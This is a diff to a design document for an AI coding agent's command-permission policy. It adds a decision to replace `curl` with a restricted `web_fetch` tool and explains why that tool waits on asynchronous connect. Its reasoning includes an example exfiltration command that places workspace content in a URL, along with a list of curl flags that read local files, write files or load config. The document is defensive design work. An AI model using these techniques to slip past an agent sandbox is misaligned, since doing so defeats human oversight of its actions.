@@ -63,7 +63,7 @@ advisory layer for everywhere else.
 | Read-only inspection: `git status/diff/log`, `grep`, `find -name` | silent | silent, but over-broad (`find -exec` too) | the argv grammar |
 | Read outside the workspace | prompt | prompt (directory rule) | done |
 | Write/delete outside the workspace | prompt | `rm` operands scoped by `path_operands` (advisory); `cmake -E`/`-P`/`--install` deny-listed; other writers (`find -delete`, `make`, `git checkout --`) unenforced - no shell means no `>` redirects | Landlock rung (Linux); advisory grammar elsewhere |
-| Network, installs, everything else | prompt | prompt (default) | done |
+| Network, installs, everything else | prompt | prompt (default); `curl` via `exec` gets an explicit require-approval rule pointing at `web_fetch` | done for prompting; `web_fetch` itself blocked on async connect (see E) |
 
 ### Two kinds of problem
 
@@ -450,13 +450,54 @@ Only reviewed argv sequences allowed; anything else prompts. Strongest
 and simplest to reason about, but brittle for the agent - every variant
 needs a rule, so the approval prompts come back.
 
-### E. Dedicated tools instead of `exec` - later, maybe
+### E. Dedicated tools instead of `exec` - adopted for network egress (November 2026)
 
 A `git_status` / `git_diff` / `git_log` tool that shells out with a
 fixed argv. No pattern language; the implementation *is* the
 allow-list. Costs code per command family and does not generalise;
-worth revisiting for the read-only families used constantly if the
-grammar turns out noisy.
+still worth revisiting for the read-only families used constantly if
+the grammar turns out noisy.
+
+**Network egress decided this way (November 2026).** The plan is a
+`web_fetch` tool - GET only, `http`/`https` schemes only, response
+body capped, timeout, no redirect following - allowed in
+`templates/policy.json`, plus an explicit `require_approval` rule for
+`curl` in the same file (message: use `web_fetch` instead), so the
+sanctioned path is named in the approval prompt. `wget` and friends
+are the same class and belong in the same rule family.
+
+Why not just allow `curl` with a `forbid_args` deny-list: the argv
+grammar cannot scope the URL - `args` is any-of, the URL is not a
+path operand, and there is no host/method/scheme matcher - so a curl
+rule means arbitrary egress, and exfiltration needs no body flag at
+all (`curl "https://host/?x=<workspace content>"`). The deny-list
+would additionally have to cover local file reads (`file://` - curl's
+scheme matching is case-insensitive, so a glob deny-list fails
+silent-unsafe, and `--url` / `--proto-default` hide the scheme;
+`-d @file`, `-F`, `-H @file`, `-b <file>` read local files into the
+request), local file writes (`-o`/`--output**`, `-O`, `-D`, `-c`,
+`--libcurl**`, `--trace**`, `-w @file`, `--etag-save**`), and config
+injection (`-K`/`--config**`, plus `~/.curlrc`, which argv rules
+cannot block because `args` cannot *require* `-q`). Version pinning
+would make a stale list fail safe, but the tool is the cleaner
+boundary: one code path, auditable, and expressible in the policy.
+
+**Blocker (November 2026): every connect is synchronous.** Name
+resolution is a blocking `getaddrinfo` (`address_info::resolve`,
+`lib/http/tls_connection.cpp:20`), and `tls_connection::connect`
+loops over addresses with blocking `::connect` and `SSL_connect`
+(`lib/http/tls_connection.cpp:209-258`; `http_client::connect` says
+so itself, `lib/http/http_client.h:44`). The dripcore executor is
+single-threaded, so a blocking DNS lookup or connect inside a tool
+call would freeze the whole UI; the model-API coordinators only
+connect once at startup (`agent_system::start_transport`,
+`lib/agent/agent_system.cpp:1569`), which is why nobody has felt it.
+Until async resolve/connect lands - a resolver thread handing results
+through a channel, or `getaddrinfo_a`/c-ares, plus non-blocking
+connect driven by `readable()`/`writable()` with `SSL_connect` in
+the io loop - `web_fetch` stays unimplemented and network egress
+keeps prompting. Recorded here so the decision and the curl analysis
+survive the wait.
 
 ### F. Path-taking options - adopted, for location problems
 
@@ -524,6 +565,10 @@ is the same shape as the exclusion one: compare
   the sandbox or not. Is the goal "no silent arbitrary execution" or
   "no arbitrary execution"? On the advisory rung only the former is
   achievable; the Landlock rung is what makes the latter a real option.
+- Async name resolution and connect for the planned `web_fetch` tool
+  (see "Options considered" E): a resolver thread feeding a channel,
+  or `getaddrinfo_a`/c-ares, then non-blocking connect + `SSL_connect`
+  driven by the io awaiters in `tls_connection`.
 
 ## Test plan
 
